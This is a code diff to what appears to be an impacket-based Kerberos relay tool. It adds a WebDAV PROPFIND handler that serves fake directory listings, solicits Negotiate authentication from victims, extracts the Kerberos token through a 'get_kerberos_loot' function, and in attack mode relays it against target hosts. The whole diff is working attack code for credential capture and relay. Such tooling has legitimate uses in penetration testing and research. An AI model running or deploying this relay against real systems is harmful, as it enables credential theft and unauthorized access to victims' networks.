@@ -10,6 +10,7 @@ import random
 import string
 import traceback
 from threading import Thread
+from six import PY2, b
 
 from impacket import ntlm, LOG
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
@@ -46,6 +47,48 @@ class HTTPKrbRelayServer(HTTPRelayServer):
                 return self.headers.getheader(header)
             except AttributeError:
                 return self.headers.get(header)
+
+        def do_PROPFIND(self):
+            proxy = False
+            if (".jpg" in self.path) or (".JPG" in self.path):
+                content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/image.JPG/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>4456</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>4ebabfcee4364434dacb043986abfffe</D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
+            else:
+                content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
+
+            messageType = 0
+            if PY2:
+                autorizationHeader = self.headers.getheader('Authorization')
+            else:
+                autorizationHeader = self.headers.get('Authorization')
+            if autorizationHeader is None:
+                self.do_AUTHHEAD(message=b'Negotiate')
+                return
+            else:
+                auth_header = autorizationHeader
+                try:
+                    _, blob = auth_header.split('Negotiate')
+                    token = base64.b64decode(blob.strip())
+                except:
+                    self.do_AUTHHEAD(message=b'Negotiate', proxy=proxy)
+                    return
+
+            if b'NTLMSSP' in token:
+                LOG.info('HTTPD: Client %s is using NTLM authentication instead of Kerberos' % self.client_address[0])
+                return
+            # If you're looking for the magic, it's in lib/utils/kerberos.py
+            authdata = get_kerberos_loot(token, self.server.config)
+
+            # If we are here, it was succesful
+
+            # Are we in attack mode? If so, launch attack against all targets
+            if self.server.config.mode == 'ATTACK':
+                self.do_attack(authdata)
+
+            self.send_response(207, "Multi-Status")
+            self.send_header('Content-Type', 'application/xml')
+            self.send_header('Content-Length', str(len(content)))
+            self.end_headers()
+            self.wfile.write(content)
 
         def do_GET(self):
             messageType = 0
